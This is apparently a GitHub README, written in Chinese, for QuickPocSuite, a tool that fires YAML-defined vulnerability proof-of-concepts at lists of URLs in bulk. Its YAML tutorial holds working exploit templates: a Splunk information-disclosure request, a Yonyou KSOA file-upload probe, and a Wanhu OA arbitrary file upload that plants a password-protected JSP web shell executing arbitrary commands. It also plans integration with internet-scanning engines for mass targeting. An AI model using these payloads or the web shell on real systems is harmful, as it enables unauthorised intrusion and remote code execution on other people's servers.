# QuickPocSuite
![QuickPocSuite](https://socialify.git.ci/W01fh4cker/QuickPocSuite/image?description=1&descriptionEditable=%E4%B8%80%E6%AC%BE%E5%9F%BA%E4%BA%8Eyaml%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%EF%BC%8C%E9%80%82%E7%94%A8%E4%BA%8E%E5%88%A9%E7%94%A8%E5%A4%8D%E6%9D%82%E7%A8%8B%E5%BA%A6%E8%BE%83%E4%BD%8E%E7%9A%84%E6%BC%8F%E6%B4%9E&forks=1&issues=1&language=1&name=1&owner=1&pattern=Brick%20Wall&stargazers=1&theme=Light)

# 使用方法

## 快速上手

```shell
# 测试环境：
git clone https://github.com/W01fh4cker/QuickPocSuite.git
cd QuickPocSuite
pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple
python QuickPocSuite.py -y <yaml文件地址> -l <需要批量利用的url文件>
# 例如：python QuickPocSuite.py -y splunk-info-disclosure.yaml -l urls.txt 
```
![image](https://github.com/W01fh4cker/QuickPocSuite/assets/101872898/223e0220-24c6-42de-9540-971c75a9e61d)

## 详细参数

```shell
  ___        _      _      ____            ____        _ _       
 / _ \ _   _(_) ___| | __ |  _ \ ___   ___/ ___| _   _(_) |_ ___ 
| | | | | | | |/ __| |/ / | |_) / _ \ / __\___ \| | | | | __/ _ \
| |_| | |_| | | (__|   <  |  __/ (_) | (__ ___) | |_| | | ||  __/
 \__\_\\__,_|_|\___|_|\_\ |_|   \___/ \___|____/ \__,_|_|\__\___|
                                                    @Version: 0.0.1-beta
                                                    @Author: W01fh4cker
                                                    @Time: 2023-5-11
    
usage: QuickPocSuite.py [-h] [-y YAML] [-l LIST] [-t THREAD] [-o OUTPUT]

QuickPocSuite v0.0.1-beta By:W01fh4cker

optional arguments:
  -h, --help            show this help message and exit
  -y YAML, --yaml YAML  the YAML file containing the PoC
  -l LIST, --list LIST  the file containing target URLs
  -t THREAD, --thread THREAD
                        the maximum time in seconds for each request,default: 20
  -o OUTPUT, --output OUTPUT
                        the file to output the results, default: output.txt
```



# yaml编写方法

适用版本：`0.0.2`

编写教程：

```yaml
# 单次GET
author: W01fh4cker
request:
  - 
    method: GET
    payload: /en-US/splunkd/__raw/services/server/info/server-info?output_mode=json
    # 自定义请求头，如果不填，则默认设置请求头只包含ua
    headers:
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
    keyword: licenseKeys
    status: 200

# 单次post，以<万户OA smartUpload.jsp 任意文件上传漏洞>为例
author: W01fh4cker
request:
  -
    method: POST
    payload: /defaultroot/extension/smartUpload.jsp?path=information&mode=add&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0
    headers:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynNQ8hoU56tfSwBVU
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
        Cookie: JSESSIONID=PjXnh6bLTzy0ygQf41vWctGPLGkSvkJ6J1yS3ppzJmCvVFQZgm1r!1156443419
        Connection: close
        data: "\
            ------WebKitFormBoundary{{rboundary}}\r\n\
            Content-Disposition: form-data; name=\"photo\"; filename=\"shell.jsp\"\r\n\
            Content-Type: application/octet-stream\r\n\
            \r\n\
            <% if(\"023\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"<pre>\"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"</pre>\"); } %>\r\n\
            ------WebKitFormBoundary{{rboundary}}\r\n\
            Content-Disposition: form-data; name=\"continueUpload\"\r\n\
            \r\n\
            1\r\n\
            ------WebKitFormBoundary{{rboundary}}\r\n\
            Content-Disposition: form-data; name=\"submit\"\r\n\
            \r\n\
            上传继续\r\n\
            ------WebKitFormBoundary{{rboundary}}--\r\n\
          "
        status: 200

# 单次post+单次get，以<用友-时空KSOA ImageUpload 任意文件上传漏洞>为例
author: W01fh4cker
request:
  -
    method: POST
    payload: /servlet/com.sksoft.bill.ImageUpload?filename=188888.txt&filepath=/
    headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
        Accept: "*/*"
        Accept-Encoding: gzip, deflate
        Connection: close
    data: 123456789
    status: 200
  -
    method: GET
    payload: /pictures/188888.txt
    headers:
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
    keyword: 123456789
    status: 200
```

`payload`为需要在`url`后面拼接的内容；`keyword`为存在漏洞的`url`的界面中出现的关键字。例如：

![image](https://github.com/W01fh4cker/QuickPocSuite/assets/101872898/a336eb2b-03f2-40e7-9f51-f50c1660cbcc)

# Todo-list

- 完成`poc`为`post`请求方式部分的代码；
- 和`fofa`/`hunter`/`shodan`/`zoomeye`/`quake`等网络测绘引擎的联动；
- 自动对完成扫描的`IP`进行分析，例如反查域名/`ASN`/`org`等。
- ……（你们定，直接提issues，合理的都会满足）

# 联系方式

紧急的话直接联系Wechat：`W01fh4cker`；非紧急的话直接提`issues`。

提问的时候请贴出报错截图、`Python`版本、电脑系统版本等，方便快速定位问题，简单的能百度或`google`到的问题尽量自己查询。